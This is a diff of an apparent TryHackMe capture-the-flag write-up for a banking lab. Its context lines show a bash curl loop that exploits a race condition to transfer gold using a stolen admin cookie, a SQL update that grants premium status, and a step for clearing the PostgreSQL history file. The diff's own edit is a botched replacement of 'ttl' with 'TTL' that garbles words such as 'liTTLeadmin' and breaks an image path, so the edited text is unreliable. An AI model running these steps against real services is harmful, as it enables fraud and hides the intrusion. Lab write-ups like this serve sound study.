@@ -24,7 +24,7 @@ Without giving away of your TTPs for KOTH, but what was the most interesting KOT
 
 ## Recon
 
-The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
+The time to live(TTL) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](TryHackMe/Markdown/Racetrack-Bank/Screenshots/ping.png)
 
 
@@ -117,7 +117,7 @@ HOST = f"10.10.10.10"
 exec_racecond_exploit()
 os.exit()
 ```
-As with some python scripting endevours, it always seems to get way to bulky for a problem this simple.[The awesome briskets](https://briskets.io/racetrackbank/), pretty sure a HackTheBox Battlegrounds tournament player if memory serves me. 
+As with some python scripting endevours, it always seems to get way to bulky for a problem this simple.[The awesome briskets](https://briskets.io/racetrackbank/), pretty sure a HackTheBox BaTTLegrounds tournament player if memory serves me. 
 ```bash
 #!/bin/bash
 # Loop a curl request and make the request pretty much asyncronous by using &. sleep for .1 to give the server some breathing room.
@@ -128,7 +128,7 @@ for i in {1..10000}; do sleep .1; curl -i -s -k -X $'POST' \
     --data-binary $'user=bigadmin&amount=1' \
     $'http://10.10.49.4/api/givegold' & done
 ```
-The reason I like this is that it does not have the issues of speed that python runs into once a loop of any kind gets involved. All I changed was the username and the cookie of littleadmin. This spammed aload of curl, but only netted me 11 gold.
+The reason I like this is that it does not have the issues of speed that python runs into once a loop of any kind gets involved. All I changed was the username and the cookie of liTTLeadmin. This spammed aload of curl, but only netted me 11 gold.
 
 ![](11GOLDs.png)
 
@@ -215,8 +215,8 @@ select * from users;
 # change a table
 update users set premium='t' where id=3;
 ```
-Littleadmin has premium!
-![](littleadminhaspremium.png)
+LiTTLeadmin has premium!
+![](liTTLeadminhaspremium.png)
 
 Clean up the PostGreSQL history file
 ```bash
